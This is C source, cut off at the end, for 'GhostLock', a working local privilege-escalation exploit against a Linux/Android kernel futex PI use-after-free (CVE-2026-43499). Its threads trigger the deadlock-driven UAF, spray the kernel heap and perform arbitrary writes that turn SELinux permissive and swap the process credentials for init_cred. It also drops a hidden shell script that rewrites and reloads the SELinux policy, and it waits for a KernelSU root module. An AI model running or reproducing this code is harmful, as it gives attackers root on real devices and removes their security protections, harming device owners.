/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 *
 * ═══════════════════════════════════════════════════════════════════════
 * CRITICAL FIX (root cause of all previous errno=0 failures):
 * waiter1 must wait until owner is BLOCKED on f_pi_chain
 * (f_pi_chain & 0x80000000 != 0) BEFORE calling FUTEX_WAIT_REQUEUE_PI.
 * This ensures owner->pi_blocked_on points to f_pi_chain before the
 * rt_mutex_adjust_prio_chain walk, so the deadlock chain is complete:
 *   f_pi_target (owner) -> f_pi_chain (waiter1) -> waiter1 (self)
 * and CMP_REQUEUE_PI returns EDEADLK, triggering remove_waiter() UAF.
 * ═══════════════════════════════════════════════════════════════════════
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

/* =====================================================================
 * Checkpoint & Logging System
 * ===================================================================== */
static int g_checkpoint = 0;
static const char *g_last_ok = "none";

#define CP(name) do { \
    g_checkpoint++; \
    g_last_ok = name; \
    pr_info("[CP%03d] %s\n", g_checkpoint, name); fflush(stdout); \
} while(0)

#define CP_FAIL(fmt, ...) do { \
    pr_error("[CP%03d] FAIL: " fmt "\n", g_checkpoint, ##__VA_ARGS__); \
    fflush(stdout); \
} while(0)

#define DUMP_STATE() do { \
    pr_info("[STATE] cp=%d last_ok=%s\n", g_checkpoint, g_last_ok); \
    pr_info("[STATE] f_wait=0x%08x f_pi_target=0x%08x f_pi_chain=0x%08x\n", \
            f_wait, f_pi_target, f_pi_chain); \
    pr_info("[STATE] waiter_ready=%d waiter_waiting=%d owner_started=%d route_done=%d\n", \
            atomic_load(&waiter_ready), atomic_load(&waiter_waiting), \
            atomic_load(&owner_started), atomic_load(&route_done)); \
    pr_info("[STATE] waiter_tid=%d\n", atomic_load(&waiter_tid)); \
    pr_info("[STATE] consumer_calls=%d consumer_success=%d\n", \
            atomic_load(&consumer_calls), atomic_load(&consumer_success)); \
    fflush(stdout); \
} while(0)

/* Returns 1 if futex has FUTEX_WAITERS bit (someone is waiting on it) */
static int futex_has_waiters(uint32_t *uaddr) {
    return (atomic_load((_Atomic uint32_t *)uaddr) & 0x80000000u) != 0;
}

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      if (active_offsets->kimage_text_base) {
        p0_kimage_text_base = active_offsets->kimage_text_base;
      }
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      if (active_offsets->phys_offset) {
        p0_phys_offset = active_offsets->phys_offset;
      }
      g_init_cred_image = INIT_CRED;
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int waiter2_waiting;
atomic_int waiter2_go;
atomic_int waiter2_done;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;
/* The vendor HW_FUTEX_PI path may require a value-based PI cycle.  In this
 * mode the futex owner words are seeded with the participating TIDs instead
 * of being populated by LOCK_PI; the owner then blocks on the waiter's
 * chain.  Keep this opt-in until the trigger has been observed. */
static int g_probe_cycle;
static int g_probe_only;
static int g_one_shot;

/* =====================================================================
 * waiter2_thread — first waiter on f_wait.  CMP_REQUEUE_PI uses
 * nr_wake=1, so this waiter is intentionally created before waiter1 and
 * consumes the wake slot; waiter1 is then the waiter that is requeued to
 * f_pi_target and reaches the PI deadlock path.
 * ===================================================================== */
void *waiter2_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  CP("waiter2_thread: started");

  while (!atomic_load(&waiter2_go)) {
    __asm__ volatile("yield" ::: "memory");
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter2_waiting, 1);
  pr_info("[waiter2] entering FUTEX_WAIT_REQUEUE_PI timeout=%ld.%09ld\n",
          (long)timeout.tv_sec, (long)timeout.tv_nsec);
  fflush(stdout);

  errno = 0;
  long w_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &timeout,
                        &f_pi_target, 0);
  int w_errno = errno;
  pr_info("[waiter2] FUTEX_WAIT_REQUEUE_PI returned ret=%ld errno=%d\n",
          w_ret, w_errno);
  fflush(stdout);
  atomic_store(&waiter2_done, 1);
  return NULL;
}

/* =====================================================================
 * waiter_thread — waits for owner to block on f_pi_chain, then calls
 * FUTEX_WAIT_REQUEUE_PI to complete the deadlock chain.
 * ===================================================================== */
void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  CP("waiter_thread: started");
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  pr_info("[waiter] tid=%d\n", tid); fflush(stdout);

  CP("waiter_thread: acquiring f_pi_chain");
  errno = 0;
  long lock_ret = 0;
  if (g_probe_cycle) {
    __atomic_store_n(&f_pi_chain, (uint32_t)tid, __ATOMIC_RELEASE);
    pr_info("[waiter] probe-cycle seeded f_pi_chain with tid=%d value=0x%08x\n",
            tid, f_pi_chain); fflush(stdout);
  } else {
    lock_ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    pr_info("[waiter] lock f_pi_chain ret=%ld errno=%d value=0x%08x\n",
            lock_ret, errno, f_pi_chain); fflush(stdout);
    if (lock_ret != 0) {
      CP_FAIL("failed to lock f_pi_chain errno=%d", errno);
      DUMP_STATE();
      return NULL;
    }
  }
  CP("waiter_thread: f_pi_chain locked");

  atomic_store(&waiter_ready, 1);
  CP("waiter_thread: waiter_ready=1");

  int wait_owner = 0;
  while (!atomic_load(&owner_started)) {
    usleep(1000);
    wait_owner++;
    if (wait_owner % 5000 == 0) {
      pr_info("[waiter] waiting owner_started (%d s)\n", wait_owner/1000);
      fflush(stdout);
    }
    if (wait_owner > 30000) {
      CP_FAIL("timeout waiting owner_started");
      DUMP_STATE();
      return NULL;
    }
  }
  CP("waiter_thread: owner_started received");

  /* ===== CRITICAL TIMING FIX =====
   * Wait until owner is blocked on f_pi_chain (FUTEX_WAITERS bit set).
   * Without this, owner->pi_blocked_on is NULL when rt_mutex_adjust_prio_chain
   * runs, so no deadlock is detected and CMP_REQUEUE_PI returns 0 instead of
   * EDEADLK. The UAF path in remove_waiter() is never reached. */
  CP("waiter_thread: waiting for owner to block on f_pi_chain");
  int wait_chain = 0;
  while (!futex_has_waiters(&f_pi_chain)) {
    usleep(1000);
    wait_chain++;
    if (wait_chain % 5000 == 0) {
      pr_info("[waiter] waiting owner on f_pi_chain (%d s) f_pi_chain=0x%08x\n",
              wait_chain/1000, f_pi_chain); fflush(stdout);
    }
    if (wait_chain > 30000) {
      CP_FAIL("timeout waiting owner on f_pi_chain (value=0x%08x)", f_pi_chain);
      DUMP_STATE();
      break;  /* try anyway - maybe bit was missed */
    }
  }
  pr_info("[waiter] owner blocked on f_pi_chain after %d ms (f_pi_chain=0x%08x)\n",
          wait_chain, f_pi_chain); fflush(stdout);
  CP("waiter_thread: owner is blocked on f_pi_chain");

  /* The standard route uses a second waiter so the requeue slot reaches
   * waiter1.  The value-based probe must use exactly one waiter, matching
   * the proven variant-10 cycle; a second waiter can consume the proxy-lock
   * walk and make CMP_REQUEUE_PI return a clean count instead. */
  if (!g_probe_cycle) {
    while (!atomic_load(&waiter2_waiting)) {
      usleep(1000);
    }
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  pr_info("[waiter] entering FUTEX_WAIT_REQUEUE_PI timeout=%ld.%09ld\n",
          (long)timeout.tv_sec, (long)timeout.tv_nsec); fflush(stdout);

  errno = 0;
  long w_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &timeout, &f_pi_target, 0);
  int w_errno = errno;
  pr_info("[waiter] FUTEX_WAIT_REQUEUE_PI returned ret=%ld errno=%d\n",
          w_ret, w_errno); fflush(stdout);

  if (w_ret == 0) {
    CP("waiter_thread: WAIT_REQUEUE_PI success (requeued)");
  } else if (w_errno == EAGAIN) {
    CP("waiter_thread: WAIT_REQUEUE_PI EAGAIN (value mismatch)");
  } else if (w_errno == EINTR) {
    CP("waiter_thread: WAIT_REQUEUE_PI EINTR");
  } else if (w_errno == ETIMEDOUT) {
    CP("waiter_thread: WAIT_REQUEUE_PI TIMEOUT (this is bad!)");
  } else if (w_errno == EDEADLK) {
    CP("waiter_thread: *** WAIT_REQUEUE_PI EDEADLK *** (UAF triggered!)");
  } else {
    CP("waiter_thread: WAIT_REQUEUE_PI unknown errno");
  }

  CP("waiter_thread: calling do_pselect_fake_lock_route");
  do_pselect_fake_lock_route();
  CP("waiter_thread: do_pselect_fake_lock_route returned");

  atomic_store(&route_done, 1);
  CP("waiter_thread: route_done=1");

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  CP("waiter_thread: f_pi_chain unlocked");

  int wait_owner_done = 0;
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
    wait_owner_done++;
    if (wait_owner_done > 5000) break;
  }
  CP("waiter_thread: complete");
  return NULL;
}

/* =====================================================================
 * owner_thread — locks f_pi_target, waits for waiter_ready, then tries
 * to lock f_pi_chain (blocks because waiter1 holds it).
 * ===================================================================== */
void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  CP("owner_thread: started");
  int tid = (int)syscall(SYS_gettid);
  pr_info("[owner] tid=%d\n", tid); fflush(stdout);

  /* Keep the owner at a lower effective priority than waiter1.  The Huawei
   * rtmutex path can stop the chain walk when waiter and owner priorities are
   * equal, which makes CMP_REQUEUE_PI succeed without reporting EDEADLK. */
  errno = 0;
  long nice_ret = sched_setattr_tid(tid, 10);
  pr_info("[owner] sched_setattr nice=10 ret=%ld errno=%d\n",
          nice_ret, errno); fflush(stdout);

  CP("owner_thread: acquiring f_pi_target");
  errno = 0;
  long lock_ret = 0;
  if (g_probe_cycle) {
    __atomic_store_n(&f_pi_target, (uint32_t)tid, __ATOMIC_RELEASE);
    pr_info("[owner] probe-cycle seeded f_pi_target with tid=%d value=0x%08x\n",
            tid, f_pi_target); fflush(stdout);
  } else {
    lock_ret = futex_op(&f_pi_target, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    pr_info("[owner] lock f_pi_target ret=%ld errno=%d value=0x%08x\n",
            lock_ret, errno, f_pi_target); fflush(stdout);
    if (lock_ret != 0) {
      CP_FAIL("failed to lock f_pi_target errno=%d", errno);
      DUMP_STATE();
      return NULL;
    }
  }
  CP("owner_thread: f_pi_target locked");

  int wait_waiter = 0;
  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
    wait_waiter++;
    if (wait_waiter % 5000 == 0) {
      pr_info("[owner] waiting waiter_ready (%d s)\n", wait_waiter/1000);
      fflush(stdout);
    }
    if (wait_waiter > 30000) {
      CP_FAIL("timeout waiting waiter_ready");
      DUMP_STATE();
      return NULL;
    }
  }
  CP("owner_thread: waiter_ready received");

  atomic_store(&owner_started, 1);
  CP("owner_thread: owner_started=1");

  CP("owner_thread: acquiring f_pi_chain (will block, expected)");
  errno = 0;
  long chain_ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  int chain_errno = errno;
  pr_info("[owner] lock f_pi_chain ret=%ld errno=%d (should be -1 EDEADLK or blocked)\n",
          chain_ret, chain_errno); fflush(stdout);
  if (chain_ret != 0 && chain_errno == EDEADLK) {
    CP("owner_thread: *** EDEADLK on f_pi_chain *** (deadlock detected!)");
  } else if (chain_ret == 0) {
    CP("owner_thread: f_pi_chain acquired (unexpected!)");
  } else {
    CP("owner_thread: f_pi_chain blocked (expected)");
  }
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret != 0) {
          errno = 0;
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ft, NULL, 0);
          int futex_errno = errno;
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
            sched_ret = 0;
          } else {
            pr_info("consumer: sched_setattr tid=%d ret=%ld errno=%d; "
                    "FUTEX_LOCK_PI ret=%ld errno=%d\n",
                    tid, sched_ret, sched_errno, fret, futex_errno);
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&waiter2_waiting, 0); atomic_store(&waiter2_go, 0);
  atomic_store(&waiter2_done, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  CP("run_main_route: state reset");

  pthread_t waiter2, waiter, owner, consumer;
  int have_waiter2 = 0;

  if (!g_probe_cycle) {
    CP("run_main_route: creating waiter2");
    SYSCHK(pthread_create(&waiter2, NULL, waiter2_thread, NULL));
    have_waiter2 = 1;
    atomic_store(&waiter2_go, 1);

    /* Confirm waiter2 entered f_wait before creating waiter1. */
    int waiter2_wait = 0;
    while (!atomic_load(&waiter2_waiting)) {
      usleep(1000);
      if (++waiter2_wait > 5000) {
        CP_FAIL("timeout waiting for waiter2 to enter f_wait");
        DUMP_STATE();
        return;
      }
    }
    CP("run_main_route: waiter2 is queued");
    usleep(50000);
  } else {
    CP("run_main_route: probe-cycle uses one waiter");
  }

  CP("run_main_route: creating waiter1");
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  CP("run_main_route: waiter1 created");

  CP("run_main_route: creating owner");
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  CP("run_main_route: owner created");

  CP("run_main_route: creating consumer");
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  CP("run_main_route: consumer created");

  CP("run_main_route: waiting for waiter_waiting && owner_started");
  int wait_count = 0;
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
    wait_count++;
    if (wait_count % 5000 == 0) {
      pr_info("[main] still waiting: waiter_waiting=%d owner_started=%d (%d s)\n",
              atomic_load(&waiter_waiting), atomic_load(&owner_started), wait_count/1000);
      fflush(stdout);
    }
    if (wait_count > 30000) {
      CP_FAIL("timeout waiting for threads");
      DUMP_STATE();
      return;
    }
  }
  CP("run_main_route: both waiter_waiting && owner_started ready");

  /* Extra safety: verify f_pi_chain has WAITERS bit */
  CP("run_main_route: verifying f_pi_chain has WAITERS bit");
  int chain_wait = 0;
  while (!futex_has_waiters(&f_pi_chain)) {
    usleep(1000);
    chain_wait++;
    if (chain_wait > 3000) {
      pr_warning("[main] f_pi_chain has no WAITERS bit after %d ms (value=0x%08x)\n",
                 chain_wait, f_pi_chain); fflush(stdout);
      break;
    }
  }
  pr_info("[main] f_pi_chain=0x%08x f_pi_target=0x%08x f_wait=0x%08x\n",
          f_pi_chain, f_pi_target, f_wait); fflush(stdout);
  CP("run_main_route: futex state captured");

  usleep(100000);

  CP("run_main_route: firing CMP_REQUEUE_PI");
  errno = 0;
  long req_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, (void *)1, &f_pi_target, 0);
  int req_errno = errno;
  pr_info("[main] CMP_REQUEUE_PI ret=%ld errno=%d\n", req_ret, req_errno);
  fflush(stdout);

  if (req_ret == -1 && req_errno == EDEADLK) {
    CP("run_main_route: *** EDEADLK DETECTED *** (UAF triggered!)");
  } else if (req_ret == -1 && req_errno == EAGAIN) {
    CP_FAIL("EAGAIN (value mismatch)");
    DUMP_STATE();
  } else if (req_ret == -1 && req_errno == EINVAL) {
    CP_FAIL("EINVAL (invalid operation)");
    DUMP_STATE();
  } else if (req_ret == -1 && req_errno == ENOMEM) {
    CP_FAIL("ENOMEM");
    DUMP_STATE();
  } else if (req_ret == 0) {
    CP_FAIL("ret=0 (no waiters on f_wait!)");
    DUMP_STATE();
  } else if (req_ret >= 1) {
    CP_FAIL("ret=%ld (no deadlock, requeue succeeded)", req_ret);
    DUMP_STATE();
  }

  /* Never continue into the pselect write route unless the PI deadlock
   * condition was actually reported.  On Huawei's HW_FUTEX_PI path a
   * successful requeue can otherwise leave the helper threads in a state
   * that is unsafe to use for the arbitrary-write stage. */
  if (!(req_ret == -1 && req_errno == EDEADLK)) {
    pr_error("[main] aborting route: expected CMP_REQUEUE_PI EDEADLK\n");
    fflush(stdout);
    _exit(2);
  }

  if (g_probe_only) {
    pr_info("[main] probe-only: EDEADLK confirmed; stopping before write route\n");
    fflush(stdout);
    _exit(0);
  }

  pr_info("[main] after requeue: f_wait=0x%08x f_pi_target=0x%08x f_pi_chain=0x%08x\n",
          f_wait, f_pi_target, f_pi_chain); fflush(stdout);

  CP("run_main_route: waiting for route_done");
  int route_wait = 0;
  while (!atomic_load(&route_done)) {
    usleep(5000);
    route_wait++;
    if (route_wait % 2000 == 0) {
      pr_info("[main] waiting route_done (%d s)\n", route_wait/200);
      fflush(stdout);
    }
    if (route_wait > 12000) {
      CP_FAIL("timeout waiting for route_done");
      DUMP_STATE();
      return;
    }
  }
  CP("run_main_route: route_done received");

  if (have_waiter2) {
    pthread_join(waiter2, NULL);
    CP("run_main_route: waiter2 joined");
  }
  pthread_join(waiter, NULL);
  CP("run_main_route: waiter joined");
  pthread_join(consumer, NULL);
  CP("run_main_route: consumer joined");
  /* owner is intentionally left blocked on f_pi_chain */
  CP("run_main_route: COMPLETE");
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  CP("do_one_write: start");
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  if (g_probe_only) {
    pr_info("[probe-only] skipping KernelSnitch and arbitrary-write preparation\n");
    run_main_route_threads();
    clear_pselect_write();
    return 1;
  }
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) {
    CP_FAIL("heap spray failed");
    clear_pselect_write();
    return 0;
  }
  TIMER("  heap spray done");
  CP("do_one_write: heap spray done");
  run_main_route_threads();
  TIMER("  PI route done");
  CP("do_one_write: PI route done");
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int write_selinux_policy_fix_script(void) {
  static const char fix_script[] =
    "#!/system/bin/sh\n"
    "P=/sys/fs/selinux/policy\n"
    "L=/sys/fs/selinux/load\n"
    "T=/data/local/tmp/.ghostlock_policy.bin\n"
    "LOG=/data/local/tmp/.ghostlock_policy.log\n"
    "exec >>$LOG 2>&1\n"
    "echo \"[*] policy fix: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\"\n"
    "cp $P $T || { echo '[!] policy fix: policy copy failed'; exit 1; }\n"
    "SZ=$(wc -c < $T)\n"
    "[ \"$SZ\" -gt 20 ] || { echo \"[!] policy fix: policy too short ($SZ bytes)\"; exit 1; }\n"
    "ID_LEN=$(dd if=$T bs=1 skip=4 count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "CO=$((4 + 4 + ID_LEN + 4))\n"
    "CFG=$(dd if=$T bs=1 skip=$CO count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "NEW=$(( CFG | 0xC0000000 ))\n"
    "if [ \"$NEW\" != \"$CFG\" ]; then\n"
    "  printf '\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x' "
      "$((NEW & 0xFF)) $(((NEW>>8) & 0xFF)) $(((NEW>>16) & 0xFF)) $(((NEW>>24) & 0xFF))"
      " | dd of=$T bs=1 seek=$CO conv=notrunc 2>/dev/null\n"
    "  echo \"[*] policy fix: config=$CFG -> $NEW at offset=$CO (netlink flags restored)\"\n"
    "else\n"
    "  echo \"[*] policy fix: config=$CFG at offset=$CO (already has netlink flags)\"\n"
    "fi\n"
    "if load_policy $T 2>/dev/null; then\n"
    "  echo '[+] policy fix: policy loaded via load_policy'\n"
    "  rm -f $T\n"
    "  exit 0\n"
    "fi\n"
    "if cat $T > $L 2>/dev/null; then\n"
    "  echo '[+] policy fix: policy loaded via cat'\n"
    "  rm -f $T\n"
    "  exit 0\n"
    "fi\n"
    "echo '[!] policy fix: policy load failed'\n"
    "rm -f $T\n"
    "exit 1\n";
  int sfd = open("/data/local/tmp/.ghostlock_fixpol.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_info("fix_policy: write script failed errno=%d\n", errno);
    return 0;
  }
  ssize_t wrote = write(sfd, fix_script, strlen(fix_script));
  close(sfd);
  if (wrote != (ssize_t)strlen(fix_script)) {
    pr_info("fix_policy: script write failed ret=%zd errno=%d\n", wrote, errno);
    return 0;
  }
  return 1;
}

static int kernelsu_module_loaded(void) {
  int fd = open("/proc/modules", O_RDONLY);
  if (fd < 0) return 0;
  char modules[8192] = {0};
  ssize_t n = read(fd, modules, sizeof(modules) - 1);
  close(fd);
  return n > 0 && strstr(modules, "kernelsu ") != NULL;
}

static int wait_for_ksu_status(void) {
  static const char status_path[] = "/data/local/tmp/.ghostlock_ksu.status";
  for (int attempt = 1; attempt <= 40; attempt++) {
    if (kernelsu_module_loaded()) {
      pr_success("KernelSU module is loaded\n");
      return 0;
    }
    char status[128] = {0};
    int fd = open(status_path, O_RDONLY);
    if (fd >= 0) {
      ssize_t n = read(fd, status, sizeof(status) - 1);
      close(fd);
      if (n > 0) {
        status[strcspn(status, "\r\n")] = '\0';
        if (!strcmp(status, "ready")) {
          pr_success("KernelSU helper reports ready\n");
          return 0;
        }
        if (!strncmp(status, "failed:", 7)) {
          pr_error("KernelSU helper reports %s; see .ghostlock_root.log and .ghostlock_ksud.log\n",
                   status);
          return 1;
        }
      }
    }
    if (attempt == 1 || attempt % 10 == 0) {
      pr_info("waiting for KernelSU helper status (%d/40)\n", attempt);
    }
    sleep(1);
  }
  pr_error("KernelSU helper did not report readiness; see .ghostlock_root.log and .ghostlock_ksud.log\n");
  return 1;
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
